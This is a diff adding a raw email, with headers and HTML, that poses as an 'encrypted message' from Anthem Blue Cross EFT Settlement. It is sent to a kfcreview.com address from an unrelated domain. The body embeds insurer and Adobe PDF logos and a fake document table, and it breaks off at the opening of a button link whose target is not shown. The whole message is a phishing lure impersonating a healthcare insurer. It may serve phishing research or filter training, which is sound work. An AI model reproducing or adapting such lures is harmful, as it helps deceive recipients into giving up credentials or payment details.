@@ -1,0 +1,299 @@
+Return-Path: <dse_NA4_zingerpie@secure.net>
+Received: from secure.net ([202.138.114.6])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id odeir7mja3ncosbge6p77dsreqbgm5d797a4gtg1
+ for zingerpie@kfcreview.com;
+ Fri, 11 Sep 2026 17:18:06 +0000 (UTC)
+Received-SPF: none (spfCheck: 202.138.114.6 is neither permitted nor denied by domain of secure.net) client-ip=202.138.114.6; envelope-from=dse_NA4_zingerpie@secure.net; helo=secure.net;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 202.138.114.6 is neither permitted nor denied by domain of secure.net) client-ip=202.138.114.6; envelope-from=dse_NA4_zingerpie@secure.net; helo=secure.net;
+ dmarc=none header.from=secure.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFFSFdERENPOEszTHRjWHRjOGdvK3NEa0lta0MzZjlDWnUrQTBUcGR1SU9hWFpUaWxaNWFCZ1JWektEdklrZ1hBY1FCSFRCYno3d2d2WmwybUdpY0F0RnNvV2pEWkV5RVJLRzFsT05ZdEErWmIzbkRsVzdiTmJTTXFKWHovMXhBYTl3VHVuUmF4SmM2UHBwejlJWnhoM3B5L3FsUENJSFdsT2l6V29nL05WQnR1MXpIUE1OaHJwV1MyMC8zc1RPcXZtMEVsUU5yZUJDbjBRem0vQVlwQTkrbEx2L2xad3VqeXh3MVRlWC9BOHNvSzhBeHJFWUZtMzJLaHhnZWxkZGh5K2hrS010WlMvNUdNYUxEdkp0OGxYRWFJNTJpMUgzYy9CckhaVHRCNVRwV213MkZOZmp1OUM3a2tuc3VUVTBpNlE9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=oz7cmy9E4S99Qp0ke0iwkGLlaauGn6nzE+bkseKvvkh+CmfcIQazqJKTTkMj2P0KP4m8r3qDHZsyDZoBrt923iIGaYLpH2qtcFs4RdCn1mpxqnbnc4l+TSxbYhr+zBPv964ku7MnEuMx0mPn2yORaw4zCmyst/GOz1+f6/MWuKY=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1789147087; v=1; bh=GgXgzplynob1kgTe8/j3waYUCMK21qU8oA56M5xNpAU=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Anthem Blue Cross" kfcreview.com - Eft Settlement <dse_NA4_zingerpie@secure.net>
+To: zingerpie@kfcreview.com
+Subject: You've received an encrypted message from Anthem Blue Cross EFT Settlement
+Date: 11 Sep 2026 22:47:55 +0530
+Message-ID: <20260911224755.1D863167EB8CC9CE@secure.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE class=3Dv1templateContainer style=3D"BOX-SIZING: border-box; FONT-SI=
+ZE: 14px; MAX-WIDTH: 600px !important; BORDER-TOP: 0px; FONT-FAMILY: Roboto=
+, sans-serif; BORDER-RIGHT: 0px; WIDTH: 600px !important; WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: 0px; TEXT-=
+TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal=
+; BORDER-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROU=
+ND-COLOR: rgb(251,251,251); font-variant-ligatures:=20
+normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
+oration-thickness: initial; text-decoration-style: initial; text-decoration=
+-color: initial; text-size-adjust: 100%" cellSpacing=3D0 cellPadding=3D0 wi=
+dth=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD id=3Dv1templateBody style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; B=
+ORDER-BOTTOM: 0px; text-size-adjust: 100%" vAlign=3Dtop>
+<TABLE class=3Dv1mcnBoxedTextBlock style=3D"BOX-SIZING: border-box; BORDER-=
+COLLAPSE: collapse; MIN-WIDTH: 100%; text-size-adjust: 100%" cellSpacing=3D=
+0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY class=3Dv1mcnBoxedTextBlockOuter style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1mcnBoxedTextBlockInner style=3D"BOX-SIZING: border-box; text-=
+size-adjust: 100%" vAlign=3Dtop>
+<TABLE class=3Dv1mcnBoxedTextContentContainer style=3D"BOX-SIZING: border-b=
+ox; BORDER-COLLAPSE: collapse; MIN-WIDTH: 100%; FLOAT: left; text-size-adju=
+st: 100%" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" align=3Dleft borde=
+r=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 9px; PADDING-TOP: 9px;=
+ PADDING-LEFT: 18px; PADDING-RIGHT: 18px; text-size-adjust: 100%">
+<TABLE class=3Dv1mcnTextContentContainer style=3D"BOX-SIZING: border-box; B=
+ORDER-TOP: rgb(224,224,224) 1px solid; BORDER-RIGHT: rgb(224,224,224) 1px s=
+olid; BORDER-COLLAPSE: collapse; MIN-WIDTH: 100%; BORDER-BOTTOM: rgb(224,22=
+4,224) 1px solid; BORDER-LEFT: rgb(224,224,224) 1px solid; BACKGROUND-COLOR=
+: rgb(255,255,255); text-size-adjust: 100%" cellSpacing=3D0 width=3D"100%" =
+border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1mcnTextContent style=3D"BOX-SIZING: border-box; FONT-SIZE: 14=
+px; FONT-FAMILY: Verdana, Geneva, sans-serif; FONT-WEIGHT: normal; COLOR: r=
+gb(34,34,34); PADDING-BOTTOM: 18px; TEXT-ALIGN: left; PADDING-TOP: 18px; PA=
+DDING-LEFT: 18px; LINE-HEIGHT: 17px; PADDING-RIGHT: 18px; text-size-adjust:=
+ 100%" vAlign=3Dtop>
+<DIV style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; TEXT-ALIGN: cen=
+ter; PADDING-TOP: 10px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<IMG id=3Ddimg_OX1qaYevMIyohbIP0uKGwAk_33 class=3DYQ4gaf style=3D"HEIGHT: 8=
+9px; WIDTH: 135px; object-position: 50% 50%" alt=3D"Unio Specialty Care Acc=
+epts Anthem Blue ..."=20
+src=3D"data:image/png;base64,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
+QmCC" width=3D249 height=3D203 data-csiid=3D"OX1qaYevMIyohbIP0uKGwAk_10" da=
+ta-atf=3D"1">
+ <IMG style=3D"HEIGHT: 86px; WIDTH: 139px" alt=3D"Adobe PDF Logo PNG vector=
+ in SVG, PDF ..."=20
+src=3D"data:image/png;base64,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" width=3D259 height=
+=3D193><FONT size=3D3></FONT></DIV>
+<DIV style=3D"BOX-SIZING: border-box; MAX-WIDTH: 600px; BORDER-TOP: rgb(224=
+,224,224) 1px solid; FONT-FAMILY: Arial, sans-serif; BORDER-RIGHT: rgb(224,=
+224,224) 1px solid; BORDER-BOTTOM: rgb(224,224,224) 1px solid; PADDING-BOTT=
+OM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 20px; BORDER-LEFT: rgb(224,224,2=
+24) 1px solid; MARGIN: 0px auto; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb=
+(255,255,255); border-radius: 5px">
+<DIV style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 20px; PADDING-TOP: 20=
+px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Verdana, =
+Geneva, sans-serif; FONT-WEIGHT: normal; COLOR: rgb(34,34,34); PADDING-BOTT=
+OM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 10p=
+x 0px; LINE-HEIGHT: 17px; PADDING-RIGHT: 0px; text-size-adjust: 100%">Hello=
+,</P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Verdana, =
+Geneva, sans-serif; FONT-WEIGHT: normal; COLOR: rgb(34,34,34); PADDING-BOTT=
+OM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 10p=
+x 0px; LINE-HEIGHT: 17px; PADDING-RIGHT: 0px; text-size-adjust: 100%">You H=
+ave a secured encrypted message from Anthem blue cross.</P>
+<TABLE style=3D"BOX-SIZING: border-box; MARGIN-BOTTOM: 20px; BORDER-TOP: rg=
+b(224,224,224) 1px solid; BORDER-RIGHT: rgb(224,224,224) 1px solid; WIDTH: =
+484px; MARGIN-TOP: 20px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(224,=
+224,224) 1px solid; BORDER-LEFT: rgb(224,224,224) 1px solid; text-size-adju=
+st: 100%">
+<THEAD style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box; BACKGROUND-COLOR: rgb(249,249,249)">
+<TH style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(224,224,224) 1px so=
+lid; PADDING-BOTTOM: 10px; TEXT-ALIGN: left; PADDING-TOP: 10px; PADDING-LEF=
+T: 10px; PADDING-RIGHT: 10px">Doc name</TH>
+<TH style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(224,224,224) 1px so=
+lid; PADDING-BOTTOM: 10px; TEXT-ALIGN: left; PADDING-TOP: 10px; PADDING-LEF=
+T: 10px; PADDING-RIGHT: 10px">Current date</TH>
+<TH style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(224,224,224) 1px so=
+lid; PADDING-BOTTOM: 10px; TEXT-ALIGN: left; PADDING-TOP: 10px; PADDING-LEF=
+T: 10px; PADDING-RIGHT: 10px">Recipient</TH></TR></THEAD>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(224,224,224) 1px so=
+lid; PADDING-BOTTOM: 10px; TEXT-ALIGN: left; PADDING-TOP: 10px; PADDING-LEF=
+T: 10px; PADDING-RIGHT: 10px; text-size-adjust: 100%">Eft/ Enrollment&nbsp;=
+#001099</TD>
+<TD style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(224,224,224) 1px so=
+lid; PADDING-BOTTOM: 10px; TEXT-ALIGN: left; PADDING-TOP: 10px; PADDING-LEF=
+T: 10px; PADDING-RIGHT: 10px; text-size-adjust: 100%">09/11/26</TD>
+<TD style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(224,224,224) 1px so=
+lid; PADDING-BOTTOM: 10px; TEXT-ALIGN: left; PADDING-TOP: 10px; PADDING-LEF=
+T: 10px; PADDING-RIGHT: 10px; text-size-adjust: 100%">zingerpie@kfcreview.c=
+om</TD></TR></TBODY></TABLE>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Verdana, =
+Geneva, sans-serif; FONT-WEIGHT: normal; COLOR: rgb(34,34,34); PADDING-BOTT=
+OM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 10p=
+x 0px; LINE-HEIGHT: 17px; PADDING-RIGHT: 0px; text-size-adjust: 100%">&nbsp=
+;</P>
+<DIV style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center; MARGIN: 20px 0px"=
+><A style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; TEXT-DECORATION: none=
+; FONT-WEIGHT: normal; COLOR: white; PADDING-BOTTOM: 12px; PADDING-TOP: 12p=
